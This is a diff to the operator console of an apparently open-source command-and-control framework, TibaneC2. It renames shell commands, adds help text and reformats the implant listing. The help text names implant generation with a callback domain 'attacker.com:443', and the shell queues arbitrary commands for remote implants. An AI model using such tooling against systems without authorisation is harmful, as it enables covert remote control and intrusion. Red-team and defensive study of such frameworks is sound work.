@@ -15,6 +15,18 @@
 
 #define BUFFER_SIZE 0x100
 #define MAX_SIZE 0x20000
+#define HELP_SIZE 0x400
+
+char tibane_shell_help[HELP_SIZE] = "\n[*] Tibane-Shell Usage\n"
+                                    "   implants : show all active implants\n "
+                                    "   beacons : show all active beacons\n"
+                                    "   get-implant -os=[windows/linux] -channel=[https/tls] -domain=attacker.com:443 -o=/path/to/implant : generate implant "
+                                    "   list-tasks : shows all tasks for all implants"    
+                                    "   beacon [id] : interactive shell for selected beacon"
+                                    "   quit, q, exit : exit the program\n\n";
+char beacon_shell_help[HELP_SIZE];
+
+
 
 char *IP;
 int PORT;
@@ -31,7 +43,8 @@ void banner() {
     printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░        \n");
     printf("   ░▒▓█▓▒░   ░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓██████▓▒░░▒▓████████▓▒░ \n");
     printf("                        https://github.com/tibane0/TibaneC2\n");
-    printf("======================================================================================\n\n");                                                                                                                 
+    printf("======================================================================================\n");                                                                                                                 
+    printf("[+] Welcome to tibane shell | type 'help' for options \n\n");
 }
 
 
@@ -172,7 +185,9 @@ class DisplayInfo {
 
 
     void display_all_agents(const char* data) {
-        const char* keys[] = {"agent_id", "os", "ip", "mac", "arch", "hostname", "last_seen"};
+        printf("\n[+] Displayiing All Implants\n\n");
+
+        const char* keys[] = {"agent_id", "Operatin System", "Remote Address", "mac", "arch", "Hostname", "last_seen"};
         int num_keys = sizeof(keys)/sizeof(keys[0]);
         
         // parse json data
@@ -188,7 +203,6 @@ class DisplayInfo {
         }
 
         int length = cJSON_GetArraySize(cJSON_GetObjectItem(pdata, keys[0]));
-        printf("%-5s", "Idx");
         for (int j = 0; j < num_keys; j++) {
             if (strcmp(keys[j], "AgentID") == 0) {
                 printf("%-80s", keys[j]);  
@@ -201,7 +215,6 @@ class DisplayInfo {
         printf("==========================================================================================================================\n");
         // Rows
         for (int i = 0; i < length; i++) {
-            printf("%-5d", i);
             for (int j = 0; j < num_keys; j++) {
                 cJSON *array = cJSON_GetObjectItem(pdata, keys[j]);
                 cJSON *item = cJSON_GetArrayItem(array, i);
@@ -350,36 +363,37 @@ class Operator {
 
     public:
     void AgentShell(const char* id, RetriveInfo recvinfo, SendInfo sendinfo, DisplayInfo displayinfo) {
-        printf("\nUsing Agent ID : %s \n\n", id);
+        printf("\n[+] Using Agent ID : %s \n\n", id);
         char cmd[BUFFER_SIZE];
         while (1) {
             memset(cmd, 0, sizeof(cmd));
-            printf("~(%s)# ", id);
+            printf("\n[ tibane-shell ] (%s)$ ", id);
             fgets(cmd, sizeof(cmd) -1, stdin);
             cmd[strcspn(cmd, "\n")] = 0;
 
             if  (strncmp(cmd, "exit", 4) == 0||strncmp(cmd, "quit", 4)==0 || strncmp(cmd, "q", 1)==0) {
-                printf("[-] Back to Home Shell \n");
+                printf("\n[-] Back to Home Shell \n\n");
                 return;
             } else if (strncmp(cmd, "info", 4) == 0) {
                 // print every things about the agent | and all tasks related to agent
 
-            } else if (strncmp(cmd, "tasks", 5) == 0) {
+            } else if (strncmp(cmd, "list-tasks", 10) == 0) {
                 // print all tasks
                 // task_per_agent
                 char* data = recvinfo.tasks_per_agent(id);
                 if (!data) {
-                    printf("NO DATA \n");
+                    printf("\n [-] NO DATA RELATED TO TASKS FOR %s \n\n", id);
                     continue;
                 }
                 displayinfo.display_tasks_per_agent(data);
-            } else if (strncmp(cmd, "new", 3) == 0) {
+            } else if (strncmp(cmd, "new-task", 8) == 0) {
                 char task[BUFFER_SIZE];
-                printf("[+] Enter Command: ");
-                fgets(task, sizeof(task), stdin);
-                task[strcspn(task, "\n")] =0;
+                if (sscanf(cmd, "new-task %s", task) != 1) {
+                    printf("\nFailed to add task\n\n'n");
+                    continue;
+                }
                 sendinfo.new_task(id, task);
-                printf("[+] Added Task \n");
+                printf("\n[+] Added Task \n\n");
             }
         }
     }
@@ -457,24 +471,24 @@ int main() {
     char cmd[BUFFER_SIZE];
     while (true) {
         memset(cmd, 0, sizeof(cmd));
-        printf("~# ");
+        printf("[ tibane-shell ] $ ");
         fgets(cmd, sizeof(cmd) -1, stdin);
         cmd[strcspn(cmd, "\n")] = 0;
 
-        if (strncmp(cmd, "list", 4) == 0 || strncmp(cmd, "display", 6) == 0) {
+        if (strncmp(cmd, "implants", 4) == 0) {
             char *data = recvinfo.get_info("Agents");
             if (!data) {
-                printf("NO DATA \n");
+                printf("\n[-] NO DATA \n\n");
                 continue;
             }
             displayinfo.display_all_agents(data);
         } else if (strncmp(cmd, "exit", 4) == 0||strncmp(cmd, "quit", 4)==0 || strncmp(cmd, "q", 1)==0) {
-            printf("[-] Exiting \n");
+            printf("\n[-] Exiting \n\n");
             sleep(1);
             exit(0);
-        } else if (strncmp(cmd, "use", 3) ==0) {
+        } else if (strncmp(cmd, "beacon", 3) ==0) {
             char id[66];
-            if (sscanf(cmd, "use %s", id) == 1) {
+            if (sscanf(cmd, "beacon %s", id) == 1) {
                 // confirm if id exists
                 op.AgentShell(id, recvinfo, sendinfo, displayinfo);
             } else {
@@ -484,12 +498,12 @@ int main() {
             // view all tasks
             char *data = recvinfo.get_info("Tasks");
             if (!data) {
-                printf("NO DATA \n");
+                printf("\n[-] NO DATA \n \n");
                 continue;
             }
             displayinfo.display_all_tasks(data);
         }else {
-            printf("%s", usage);
+            printf("%s", tibane_shell_help);
         }
     }
 }
